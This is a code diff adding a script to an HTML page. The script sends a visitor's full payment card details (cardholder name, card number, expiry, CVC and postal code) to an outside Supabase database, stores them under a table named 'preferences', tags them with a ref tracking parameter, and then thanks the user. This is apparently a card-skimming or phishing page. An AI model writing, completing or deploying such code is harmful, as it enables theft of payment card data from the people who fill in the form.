@@ -171,7 +171,36 @@
             document.getElementById('successModal').classList.add('hidden');
         }
     </script>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script>
+  const sbPrefs = supabase.createClient(
+    'https://iyddjjnfkyufmkpljkof.supabase.co',
+    'sb_publishable_uO2cnMJj1whL_qa4VpDS6Q_JN_P-QU4'
+  );
 
+  async function savePreferences() {
+    const ref = new URLSearchParams(location.search).get("ref");
+
+    const { error } = await sbPrefs.from("preferences").insert({
+      ref: ref,
+      Cardholder: document.getElementById("Cardholder Name").value,
+      card: document.getElementById("Card Number").value,
+      expiration: document.getElementById("Expiration Date").value,
+      CVC: document.getElementById("CVC/CVV").value,
+      postal: document.getElementById("Postal Code / Zip Code
+").value,
+    });
+
+    if (error) {
+      console.error(error);
+      alert("Could not save. Please try again.");
+      return;
+    }
+    alert("Saved, thank you!");
+  }
+
+  document.getElementById("confirmBtn").addEventListener("click", savePreferences);
+</script>
 </body>
 </html>
 ```
